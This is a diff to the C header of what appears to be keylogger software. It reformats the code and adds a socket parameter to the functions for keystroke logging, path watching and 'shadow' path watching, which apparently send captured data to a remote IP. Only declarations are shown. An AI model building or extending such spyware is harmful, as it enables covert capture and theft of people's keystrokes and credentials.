@@ -22,7 +22,7 @@
 #include <unistd.h>
 
 #define BITS_PER_LONG (sizeof(long) * 8)
-#define NBITS(x) ((((x) - 1) / BITS_PER_LONG) + 1)
+#define NBITS(x) ((((x)-1) / BITS_PER_LONG) + 1)
 #define OFF(x) ((x) % BITS_PER_LONG)
 #define BIT(x) (1UL << OFF(x))
 #define LONG(x) ((x) / BITS_PER_LONG)
@@ -35,33 +35,32 @@
 #define PATH_MAX_LEN 512
 #define EVENT_BUF_LEN (1024 * (sizeof(struct inotify_event) + NAME_MAX + 1))
 
-static volatile sig_atomic_t running              = 1;
-static uint32_t              last_scan_code       = 0;
-static int                   last_scan_code_valid = 0;
-static int                   last_scan_consumed   = 0;
-static struct timeval        start_time           = {0, 0};
-static int                   start_time_valid     = 0;
-static int                   printed_since_syn    = 0;
+static volatile sig_atomic_t running = 1;
+static uint32_t last_scan_code = 0;
+static int last_scan_code_valid = 0;
+static int last_scan_consumed = 0;
+static struct timeval start_time = {0, 0};
+static int start_time_valid = 0;
+static int printed_since_syn = 0;
 
 // Modifier key state tracking
-typedef struct
-{
-    int shift;
-    int ctrl;
-    int alt;
-    int meta;
-    int capslock;
+typedef struct {
+  int shift;
+  int ctrl;
+  int alt;
+  int meta;
+  int capslock;
 } modifier_state_t;
 
 static modifier_state_t modifiers = {0, 0, 0, 0, 0};
 
-typedef struct
-{
-    ip_info ip_ctx;
+typedef struct {
+  ip_info ip_ctx;
+  int sock;
 } receiver_args_t;
 
-void watch_path(ip_info ip_ctx, const char *path);
-void watch_path_shadow(ip_info ip_ctx, const char *path);
-int  start_keylogging(ip_info ip_ctx);
+void watch_path(ip_info ip_ctx, const char *path, int sock);
+void watch_path_shadow(ip_info ip_ctx, const char *path, int sock);
+int start_keylogging(ip_info ip_ctx, int sock);
 
 #endif // KEYLOG_H
